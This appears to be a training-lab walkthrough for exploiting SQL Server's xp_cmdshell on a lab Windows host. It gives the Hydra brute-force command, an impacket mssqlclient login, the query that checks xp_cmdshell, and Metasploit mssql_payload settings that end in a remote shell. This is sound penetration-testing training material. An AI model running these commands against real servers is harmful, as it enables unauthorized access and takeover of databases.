
**xp_cmdshell** is a SQL server stored procedure enabling command shell execution. Misconfigured xp_cmdshell can lead to arbitrary command execution, data exfiltration, and potential network compromise, posing significant security risks. Proper configuration and security measures are crucial to mitigate these risks

During the Nmap scan, we observed that host **10.10.1.30** (which is **Windows Server 2019 (AD)** virtual machine) has port **1433** open. We will attempt to brute force the password using **Hydra**, as we already know the username, which is **SQL_srv**

In the **Parrot Security** machine login with **attacker/toor** credentials.Open a new **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**)

Save the username **SQL_srv** in a text file and name it as **user.txt** using command **pluma user.txt**

Execute command **hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql** to brute force the MSSQL service password

We have successfully cracked the password for **SQL_srv**, which is "**batman**". Next, we will attempt to log into the service using **mssqlclient.py**

Execute command **python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433**
Note the database name, which is "**master**" here

Execute the SQL query **SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';**, returning a value of 1, indicating that xp_cmdshell is enabled on the server

Now, as we know that **xp_cmdshell** is enabled on SQL server we can use Metasploit to exploit this service. Type **exit** and press **Enter**; then execute the command **msfconsole** to launch Metasploit

Execute the following commands:

- **use exploit/windows/mssql/mssql_payload**
- **set RHOST 10.10.1.30**
- **set USERNAME SQL_srv**
- **set PASSWORD batman**
- **set DATABASE master**

Once all commands are configured, type **exploit** and press **Enter**

Type command **shell** and press **Enter**. 

Execute **whoami** command, to determine the username of the currently logged on user. Here, it is $sqlexpress which is the SQL service





